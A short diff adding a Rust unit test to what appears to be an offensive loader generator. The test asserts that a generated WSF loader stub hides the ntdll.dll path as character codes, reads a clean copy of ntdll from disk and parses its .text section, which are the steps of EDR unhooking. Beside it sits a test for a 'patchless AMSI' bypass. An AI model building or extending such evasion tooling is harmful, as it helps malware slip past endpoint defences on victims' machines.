@@ -526,3 +526,19 @@ fn wsf_stub_has_patchless_amsi() {
         "stub must reference AmsiScanBuffer via charcode");
 }
 
+#[test]
+fn wsf_stub_has_unhook() {
+    let mut cfg = base_config(LoaderType::Wsf);
+    cfg.wsf_stub_config = Some(WsfStubConfig {
+        namespace: "x".into(), type_name: "y".into(),
+    });
+    let stub = generate_wsf_stub_source(&cfg).unwrap();
+    // ntdll.dll path charcode: "C:\Windows\System32\ntdll.dll" first byte = 67 ('C')
+    assert!(stub.contains("67,58,92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,110,116,100,108,108,46,100,108,108"),
+        "stub must reference ntdll path charcode for unhook");
+    assert!(stub.contains("File.ReadAllBytes"),
+        "stub must read clean ntdll from disk");
+    assert!(stub.contains("0x2E") && stub.contains("0x74"),
+        "stub must parse .text section signature");
+}
+
